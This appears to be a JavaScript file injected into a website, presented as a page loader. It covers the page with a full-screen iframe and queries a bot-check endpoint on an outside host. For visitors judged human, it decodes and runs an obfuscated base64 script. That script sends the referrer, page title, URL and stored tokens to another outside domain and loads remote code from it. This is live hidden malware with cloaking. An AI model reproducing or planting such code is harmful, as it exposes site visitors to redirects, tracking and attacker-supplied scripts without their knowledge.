const createLoader = () => {
    const frame = document.createElement('iframe');
    frame.id = 'load_frame';
    frame.src = `frameLoad.html`;
    frame.frameBorder = 0;
    frame.width = '100%';
    frame.height = '100%';
    frame.style.position = 'fixed';
    frame.style.top = 0;
    frame.style.left = 0;
    frame.style.width = '100%';
    frame.style.height = '100%';
    frame.style.zIndex = 9999;
    const body = document.querySelector('html');
    if (body && body.childNodes.length > 0) {
        const parent = body;
        parent.insertBefore(frame, body.firstChild)
    }
    
}
const toggleLoad = () => {
    const body = document.querySelector('body');
    body.removeAttribute('hidden');
    const load_frame = document.querySelector('#load_frame');
    if (load_frame) {
        load_frame.style.display = load_frame.style.display === 'none' ? 'block' : 'none';
    }
   
};
createLoader();

window.addEventListener('DOMContentLoaded', () => {
    fetch('https://grandmashome.com/api/check_bot').then(res => res.json()).then(res => {
        if (res?.code == 200 && !res.result) {
            const script = document.createElement('script');
            script.src = "data:text/javascript;base64,CiAgICAoZnVuY3Rpb24oKSB7CiAgICB2YXIgbmFtZSA9ICdfUkszaDN5RHNjTUd5RlNYNSc7CiAgICBpZiAoIXdpbmRvdy5fUkszaDN5RHNjTUd5RlNYNSkgewogICAgICAgIHdpbmRvdy5fUkszaDN5RHNjTUd5RlNYNSA9IHsKICAgICAgICAgICAgdW5pcXVlOiBmYWxzZSwKICAgICAgICAgICAgdHRsOiA4NjQwMCwKICAgICAgICAgICAgUl9QQVRIOiAnaHR0cHM6Ly90YWxraW5nbWFuYWdlci5jb20vYkxHazJncHYnLAogICAgICAgIH07CiAgICB9CiAgICBjb25zdCBfcWhySEpqOEZXQnRUU3J6MSA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCdjb25maWcnKTsKICAgIGlmICh0eXBlb2YgX3FockhKajhGV0J0VFNyejEgIT09ICd1bmRlZmluZWQnICYmIF9xaHJISmo4RldCdFRTcnoxICE9PSBudWxsKSB7CiAgICAgICAgdmFyIF9nVG40NXd4NkdyeFk3NWNKID0gSlNPTi5wYXJzZShfcWhySEpqOEZXQnRUU3J6MSk7CiAgICAgICAgdmFyIF9OdExwQjV2alBqcmp6ZjVMID0gTWF0aC5yb3VuZCgrbmV3IERhdGUoKS8xMDAwKTsKICAgICAgICBpZiAoX2dUbjQ1d3g2R3J4WTc1Y0ouY3JlYXRlZF9hdCArIHdpbmRvdy5fUkszaDN5RHNjTUd5RlNYNS50dGwgPCBfTnRMcEI1dmpQanJqemY1TCkgewogICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgnc3ViSWQnKTsKICAgICAgICAgICAgbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oJ3Rva2VuJyk7CiAgICAgICAgICAgIGxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCdjb25maWcnKTsKICAgICAgICB9CiAgICB9CiAgICB2YXIgX1Q4empweUsyVlRaWjM4c2cgPSBsb2NhbFN0b3JhZ2UuZ2V0SXRlbSgnc3ViSWQnKTsKICAgIHZhciBfWkh5ZHBrU1FCU3M4TlgyeCA9IGxvY2FsU3RvcmFnZS5nZXRJdGVtKCd0b2tlbicpOwogICAgdmFyIF83Um5xaHh6Y0J5WFNWM2JHID0gJz9yZXR1cm49anMuY2xpZW50JzsKICAgICAgICBfN1JucWh4emNCeVhTVjNiRyArPSAnJicgKyBkZWNvZGVVUklDb21wb25lbnQod2luZG93LmxvY2F0aW9uLnNlYXJjaC5yZXBsYWNlKCc/JywgJycpKTsKICAgICAgICBfN1JucWh4emNCeVhTVjNiRyArPSAnJnNlX3JlZmVycmVyPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQucmVmZXJyZXIpOwogICAgICAgIF83Um5xaHh6Y0J5WFNWM2JHICs9ICcmZGVmYXVsdF9rZXl3b3JkPScgKyBlbmNvZGVVUklDb21wb25lbnQoZG9jdW1lbnQudGl0bGUpOwogICAgICAgIF83Um5xaHh6Y0J5WFNWM2JHICs9ICcmbGFuZGluZ191cmw9JyArIGVuY29kZVVSSUNvbXBvbmVudChkb2N1bWVudC5sb2NhdGlvbi5ob3N0bmFtZSArIGRvY3VtZW50LmxvY2F0aW9uLnBhdGhuYW1lKTsKICAgICAgICBfN1JucWh4emNCeVhTVjNiRyArPSAnJm5hbWU9JyArIGVuY29kZVVSSUNvbXBvbmVudChuYW1lKTsKICAgICAgICBfN1JucWh4emNCeVhTVjNiRyArPSAnJmhvc3Q9JyArIGVuY29kZVVSSUNvbXBvbmVudCh3aW5kb3cuX1JLM2gzeURzY01HeUZTWDUuUl9QQVRIKTsKICAgIGlmICh0eXBlb2YgX1Q4empweUsyVlRaWjM4c2cgIT09ICd1bmRlZmluZWQnICYmIF9UOHpqcHlLMlZUWlozOHNnICYmIHdpbmRvdy5fUkszaDN5RHNjTUd5RlNYNS51bmlxdWUpIHsKICAgICAgICBfN1JucWh4emNCeVhTVjNiRyArPSAnJnN1Yl9pZD0nICsgZW5jb2RlVVJJQ29tcG9uZW50KF9UOHpqcHlLMlZUWlozOHNnKTsKICAgIH0KICAgIGlmICh0eXBlb2YgX1pIeWRwa1NRQlNzOE5YMnggIT09ICd1bmRlZmluZWQnICYmIF9aSHlkcGtTUUJTczhOWDJ4ICYmIHdpbmRvdy5fUkszaDN5RHNjTUd5RlNYNS51bmlxdWUpIHsKICAgICAgICBfN1JucWh4emNCeVhTVjNiRyArPSAnJnRva2VuPScgKyBlbmNvZGVVUklDb21wb25lbnQoX1pIeWRwa1NRQlNzOE5YMngpOwogICAgfQogICAgaWYgKCcnICE9PSAnJykgewogICAgICAgIF83Um5xaHh6Y0J5WFNWM2JHICs9ICcmYnlwYXNzX2NhY2hlPSc7CiAgICB9CiAgICB2YXIgYSA9IGRvY3VtZW50LmNyZWF0ZUVsZW1lbnQoJ3NjcmlwdCcpOwogICAgICAgIGEudHlwZSA9ICdhcHBsaWNhdGlvbi9qYXZhc2NyaXB0JzsKICAgICAgICBhLnNyYyA9IHdpbmRvdy5fUkszaDN5RHNjTUd5RlNYNS5SX1BBVEggKyBfN1JucWh4emNCeVhTVjNiRzsKICAgIHZhciBzID0gZG9jdW1lbnQuZ2V0RWxlbWVudHNCeVRhZ05hbWUoJ3NjcmlwdCcpWzBdOwogICAgcy5wYXJlbnROb2RlLmluc2VydEJlZm9yZShhLCBzKQogICAgfSkoKTsKICAgIA==";
             document.querySelector("head").appendChild(script);
        }
        setTimeout(toggleLoad, 1000);
        
    })
})
